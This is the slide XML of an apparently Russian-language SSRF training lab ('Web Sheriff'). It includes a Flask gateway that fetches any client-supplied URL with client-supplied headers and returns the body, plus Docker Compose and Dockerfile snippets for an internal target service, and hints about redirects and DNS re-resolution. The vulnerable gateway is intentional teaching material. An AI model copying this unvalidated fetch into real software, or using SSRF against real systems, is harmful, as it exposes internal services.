              <a:defRPr sz="127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адрес и headers</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="13" name="flow-fetch">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7C7BED2D-98A3-43D7-9F86-3D9E8DD8C569}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6667500" y="3467100"/>
            <a:ext cx="1733550" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23813">
            <a:solidFill>
              <a:srgbClr val="A87D7D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="flow-label-fetch">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D2CBEF99-0730-4CD9-9BD5-9600C9BF6330}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6762750" y="3019425"/>
            <a:ext cx="1543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Запрос сервера</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="15" name="flow-data">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EF3E965C-DCF8-4C28-9DD9-0712AEDEA581}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6667500" y="4876800"/>
            <a:ext cx="1733550" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23813">
            <a:solidFill>
              <a:srgbClr val="8D9BA5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:headEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="flow-label-data">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A80DD397-BFC7-4B98-A566-65BDD20747E1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6762750" y="5000625"/>
            <a:ext cx="1543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lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:def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Ответ сервиса</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="target">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D6BCF87E-E339-41A6-9DE4-D4F9DD11B74E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1019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url определяет цель запроса, headers - передаваемые заголовки.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="redirect">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B2F96054-BEA5-4EA3-8FE2-949921710121}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="6086475"/>
            <a:ext cx="609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dirty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Redirect: Location </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650" b="0" dirty="0" err="1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меняет</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650" b="0" dirty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 URL </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650" b="0" dirty="0" err="1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следующего</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650" b="0" dirty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0" dirty="0" err="1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запроса</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650" b="0" dirty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19" name="dns">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BF25FB21-B0DB-4AC4-8BBE-471E0CCB565A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7067550" y="6086475"/>
            <a:ext cx="4438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650" b="0">
                <a:solidFill>
                  <a:srgbClr val="A9B7C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dirty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DNS: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650" b="0" dirty="0" err="1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повторное</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650" b="0" dirty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0" dirty="0" err="1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разрешение</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650" b="0" dirty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0" dirty="0" err="1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имени</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650" b="0" dirty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0" dirty="0" err="1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может</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650" b="0" dirty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0" dirty="0" err="1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дать</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650" b="0" dirty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0" dirty="0" err="1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другой</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A9B7C6"/>
                </a:solidFill>
                <a:latin typeface="DejaVu Sans"/>
                <a:ea typeface="DejaVu Sans"/>
                <a:cs typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t> IP.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="component-server-22">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{374AA910-E7E0-403C-A9D3-6B88A4199B65}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4867275" y="2876550"/>
            <a:ext cx="495300" cy="141514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component-server-23">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E7EB15CC-B68A-496A-8F10-A6861B9F984D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5274128" y="2920774"/>
            <a:ext cx="35378" cy="35378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component-server-24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{48C47EBB-174E-4E35-9D84-D89EBA4928B1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4867275" y="3053442"/>
            <a:ext cx="495300" cy="141514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component-server-25">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{010AE264-8A77-4442-8085-993090309F69}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5274128" y="3097666"/>
            <a:ext cx="35378" cy="35378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component-server-26">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FA25DBE-085B-44B1-A38A-5E2B3762CB1A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4867275" y="3230335"/>
            <a:ext cx="495300" cy="141514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component-server-27">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BA936154-4099-403E-B3FF-A05C438C10A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5274128" y="3274560"/>
            <a:ext cx="35378" cy="35378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component-server-28">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{374AA910-E7E0-403C-A9D3-6B88A4199B65}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9705975" y="2876550"/>
            <a:ext cx="495300" cy="141514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component-server-29">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E7EB15CC-B68A-496A-8F10-A6861B9F984D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10112828" y="2920774"/>
            <a:ext cx="35378" cy="35378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component-server-30">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{48C47EBB-174E-4E35-9D84-D89EBA4928B1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9705975" y="3053442"/>
            <a:ext cx="495300" cy="141514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component-server-31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{010AE264-8A77-4442-8085-993090309F69}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10112828" y="3097666"/>
            <a:ext cx="35378" cy="35378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component-server-32">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FA25DBE-085B-44B1-A38A-5E2B3762CB1A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9705975" y="3230335"/>
            <a:ext cx="495300" cy="141514"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6500"/>
            </a:avLst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component-server-33">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BA936154-4099-403E-B3FF-A05C438C10A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10112828" y="3274560"/>
            <a:ext cx="35378" cy="35378"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="17145">
            <a:solidFill>
              <a:srgbClr val="A87D7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1" name="Рисунок 22">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A21B4C66-8DE8-4762-97B1-918E297D8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9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DA75F4E6-C282-49F0-BDBE-6C2992FDAFC5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Web Sheriff: задание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CE08474-F0A6-4B31-8FC9-101FF22ED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269878" y="1809750"/>
            <a:ext cx="6004169" cy="4181475"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="v2-text-97">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AABBC1F9-0DC7-4046-B92E-07B079E8E673}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="1857375"/>
            <a:ext cx="308610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5000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:def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Получить ответ внутреннего сервиса через gateway</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="v2-text-98">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AB1EF312-91B8-4F91-8C92-11288951FF5A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="4343400"/>
            <a:ext cx="3086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Совместная практика</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="v2-text-99">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DE36FC07-D66D-49AA-B39B-20B9448CB46E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="5267325"/>
            <a:ext cx="3086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A9B7C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A9B7C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9B7C6"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>127.0.0.1:8089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23C4835-CA53-4D2C-929B-D4BF43F36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5964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616BEC4-F0B6-4606-8802-A8DB36298833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Web Sheriff: шаг 1. Код gateway</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="gateway-heading">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{28F2E6BA-BB08-421B-A866-2A259D2319D4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8134350" y="2305050"/>
            <a:ext cx="33718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Что контролирует клиент</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="gateway-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{73DB4C5C-1938-40F1-9FBA-BA8C800E8E6F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8134350" y="3181350"/>
            <a:ext cx="337185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URL и headers берутся из JSON-запроса.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2025" b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00000"/>
              </a:lnSpc>
              <a:buNone/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requests.get отправляет их от имени gateway.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2025" b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00000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:def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Тело ответа возвращается пользователю.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="editable-source-code-103">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DDB3FEF4-E008-47E6-84DA-4AEA9E65641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000875" cy="444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@app.route</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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388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"/api/send"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388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methods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388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388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'POST'</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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388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F4474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88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pinger</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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()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  <a:buNone/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data = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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.loads</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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request.data</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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388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88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"url"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88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88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data:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/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388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create_resp</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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388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"The IP address was not specified"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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endParaRPr sz="1388" b="0">
              <a:solidFill>
                <a:srgbClr val="FFD70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0000"/>
              </a:lnSpc>
              <a:buNone/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headers = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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{}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/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388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88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"headers"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88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data:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/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headers = data</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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388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"headers"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/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388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  <a:buNone/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data = requests.get</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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388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388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"url"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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388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headers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=headers</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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.text</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/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388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  <a:buNone/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388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create_resp</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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388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"bebebe"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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endParaRPr sz="1388" b="0">
              <a:solidFill>
                <a:srgbClr val="FFD70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0000"/>
              </a:lnSpc>
              <a:buNone/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388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create_resp</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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388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endParaRPr sz="1388" b="0">
              <a:solidFill>
                <a:srgbClr val="FFD70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0000"/>
              </a:lnSpc>
              <a:buNone/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@app.get</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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388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'/healthz'</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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F44747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88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health</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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()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  <a:buNone/>
              <a:defRPr sz="1388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388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jsonify</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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388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388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388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'ready'</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1388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pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Рисунок 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CF61958D-2FC0-4340-B5B0-13FA13B3F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7544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18D0CEA-D947-44C8-8FA4-65D8C594199E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Web Sheriff: шаг 2. Сеть и имя сервиса</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="compose-heading">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8F37C850-F4F9-420F-AE7B-0ECDC90323D4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="2343150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Что видно в Compose</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="compose-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B850A5C5-3E5B-400D-ABB9-A467A82175D3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="3000375"/>
            <a:ext cx="5334000" cy="3105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Имя сервиса: ssrf-internal.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2100" b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Сеть: ssrf_private.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2100" b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ROLE: internal.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2100" b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Этот фрагмент описывает внутренний сервис и его сетевое окружение.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="editable-source-code-104">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E847C8A8-9AE0-41B3-873A-C5CA2D9DA9A9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4752975" cy="466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ssrf-internal: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read_only: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="93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true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security_opt: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- </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="93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no-new-privileges:true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cap_drop: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- </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="93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ALL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pids_limit: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="93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64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mem_limit: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="93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256m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cpus: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="93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1.0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tmpfs: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- </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="93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/tmp:rw,noexec,nosuid,size=64m,uid=10001,gid=10001,mode=1770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build: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context: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="93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.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dockerfile: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="93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Internal.Dockerfile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networks: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- </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="93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ssrf_private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environment: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ROLE: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="93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internal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healthcheck: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test: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- </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="93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CMD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- </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="93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/usr/local/bin/lab-service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- </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="93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healthcheck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interval: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="93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5s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timeout: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="93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3s</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="93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retries: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="93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pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Рисунок 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CF61958D-2FC0-4340-B5B0-13FA13B3F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1043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A69E750-4AF2-4430-B5A3-EE898A020AC1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Web Sheriff: шаг 3. Порты сервиса</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="ports">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0578AFDD-6D31-4111-9705-6CD3B7F87D29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10191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В образе указаны порты 1337 и 8080.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:def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EXPOSE описывает порты образа, но сам не публикует их на хосте.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="editable-source-code-105">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F753785E-4B8E-4777-BCFC-AEA9E32CF2A9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2219325"/>
            <a:ext cx="10820400" cy="2480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75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75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75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75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75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75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75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75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75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golang:1.26-bookworm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@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sha256:d9c68c2c51161e12fd77e4c6320687c9cd86e1af1e3ad6e6cd63ff970641453c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builder</a:t>
            </a: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WORKDIR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/src</a:t>
            </a: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COPY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internal/go.mod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internal/main.go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./</a:t>
            </a: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RUN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gofmt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-w *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.go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&amp;&amp;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CGO_ENABLED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7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go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build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-trimpath -ldflags=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"-s -w"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-o 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/lab-service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.</a:t>
            </a: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debian:bookworm-slim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@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sha256:7c7b2c966bc9ee8cedfeef67e0e279108992c77681fa595db4a9d65c06ccc587</a:t>
            </a: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RUN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groupadd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--gid </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="127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10001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lab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&amp;&amp;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useradd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--uid </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="127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10001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--gid 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lab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--no-create-home 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lab</a:t>
            </a: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COPY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--from=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builder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/lab-service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/usr/local/bin/lab-service</a:t>
            </a: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USER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10001:10001</a:t>
            </a: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EXPOSE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1337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75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8080</a:t>
            </a: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CMD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[</a:t>
            </a:r>
            <a:r>
